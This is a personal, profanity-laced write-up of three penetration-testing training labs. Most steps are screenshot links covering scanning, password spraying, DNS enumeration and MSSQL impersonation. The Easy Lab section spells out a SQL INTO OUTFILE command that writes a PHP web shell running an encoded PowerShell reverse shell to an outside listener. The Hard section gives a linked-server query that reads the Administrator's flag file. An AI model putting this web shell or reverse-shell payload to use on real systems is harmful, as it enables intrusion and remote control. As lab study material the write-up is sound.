## Easy Lab

![[Pasted image 20250224183951.png]]


Scanning the services give available services to attack.

Port 21 gives nothing
Port 3306 is probably an attack vector, so is 3389
Port 80 has a website which is vulnerable to File upload as per google but I cant find a way to
Port 25 is an smtp which gave me a username (I have to scan this 5 times, maybe the timeout has something to do with it)

![[Pasted image 20250224184139.png]]

password spraying
![[Pasted image 20250224190838.png]]

Bro use the same password
![[Pasted image 20250224193059.png]]

Also it looks like we can write anywher
![[Pasted image 20250224193119.png]]

using ffuf, I found out that there's these urls
![[Pasted image 20250224195228.png]]
![[Pasted image 20250224195416.png]]
which is a file storage and so is xampp

![[Pasted image 20250224201153.png]]

we see the dir is xampp

![[Pasted image 20250224202255.png]]

Note: www or htdocs or - _public_html_ are Apache's default path

Because the target is a windows host, we generate a powershell shell instead
![[Pasted image 20250224203433.png]]

Revshells.com

SELECT "<?php echo shell_exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==');?>" INTO OUTFILE 'C:/xampp/htdocs/hell.php';

Upload the shell
![[Pasted image 20250224203535.png]]

Start the netcat
![[Pasted image 20250224203547.png]]

![[Pasted image 20250224203554.png]]
Access the shell
![[Pasted image 20250224203842.png]]

## Medium Lab
![[Pasted image 20250226193456.png]]
Scanned to see
POP, DNS, SSH and FTP services
We might look at FTP, POP, DNS first.
digging the address
![[Pasted image 20250226193603.png]]


Found a app.inlanefreight.htb
![[Pasted image 20250226194602.png]]

Dig axfr the app domain gives nothing but any does
![[Pasted image 20250226195034.png]]
the app.inlanefreight.htb is useless for now
![[Pasted image 20250226195600.png]]

At this point im stupid
![[Pasted image 20250226195810.png]]Lesson learn is that we should scan all ports. But the int-ftp on a local ip hint that the host has a hidden/private service

![[Pasted image 20250226202500.png]]
![[Pasted image 20250226203056.png]]

So i found a dude called simon
![[Pasted image 20250226204623.png]]

![[Pasted image 20250226205059.png]]

## Hard
An RDP, SMB and RPC, for now. and MSSQ
![[Pasted image 20250226211655.png]]

![[Pasted image 20250226212841.png]]

somehow smbclient and hydra can't access crackmapexec but crackmapexec can?
![[Pasted image 20250226213648.png]]

Acutally, fuck this module. shitty ass connection

![[Pasted image 20250226222958.png]]

![[Pasted image 20250226223011.png]]

![[Pasted image 20250226223634.png]]![[Pasted image 20250226223648.png]]
![[Pasted image 20250226232438.png]]

fuck my miserable life, I could just type sqlcmd
![[Pasted image 20250226232610.png]]

![[Pasted image 20250226235252.png]]

impersonating john led me to another server called WIN-HARD\SQLEXPRESS

and another
![[Pasted image 20250226235321.png]]

![[Pasted image 20250226235626.png]]

We have testadmin
execute (‘select * from OPENROWSET(BULK ‘’C:/Users/Administrator/desktop/flag.txt’’, SINGLE_CLOB) AS Contents’) at [local.test.linked.srv];

